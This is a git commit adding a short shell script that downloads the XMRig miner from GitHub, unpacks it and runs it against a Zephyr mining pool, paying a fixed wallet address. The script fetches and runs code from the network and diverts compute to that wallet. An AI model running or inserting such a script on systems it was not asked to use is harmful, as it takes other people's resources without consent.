2ad51aaa018d8014f1e1ef78fc5bcb446e649ea5
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-05-02 16:07:07 +0700

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+
+# Generate random string for password
+password=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8 ; echo '')
+
+apt update
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
+tar -xzvf xmrig-6.21.1-linux-x64.tar.gz
+cd xmrig-6.21.1
+./xmrig -o sg-zephyr.miningocean.org:5332 -u ZEPHs9WzG2A6HASnGEA6xRcM7zq9fpX8TJa1azAB23GNffk7tPsguMyCefuPTN14FGK9mREnmPsdT7yC9KFpMfgUVHmZqAzQY7V -p $password -a rx/0 -k --donate-level 1
